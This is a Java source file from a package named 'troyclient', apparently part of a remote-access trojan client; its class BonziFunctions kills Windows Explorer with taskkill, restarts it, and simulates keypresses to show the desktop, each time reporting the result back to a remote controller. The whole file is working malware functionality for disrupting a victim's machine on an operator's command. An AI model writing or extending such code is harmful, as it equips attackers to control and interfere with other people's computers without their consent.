package ch.lebois.troyclient.service;

import ch.lebois.troyclient.main.GetContext;

import java.awt.*;
import java.awt.event.KeyEvent;

/**
 * @PROJECT Hermann
 */
public class BonziFunctions {

    public void killExplorer() {
        Console.execute("taskkill /f /im explorer.exe");
        GetContext.SENDER.send("commandout", "Explorer Killed");
    }

    public void resurrectExplorer() {
        Console.execute("explorer");
        GetContext.SENDER.send("commandout", "Resurrected Explorer");
    }

    public void showDesktop() {
        try {
            Robot robot = new Robot();
            robot.keyPress(KeyEvent.VK_WINDOWS);
            robot.keyPress(KeyEvent.VK_D);
            robot.keyRelease(KeyEvent.VK_D);
            robot.keyRelease(KeyEvent.VK_WINDOWS);
            GetContext.SENDER.send("commandout", "Desktop shown");
        } catch (AWTException e) {
            e.printStackTrace();
        }
    }
}
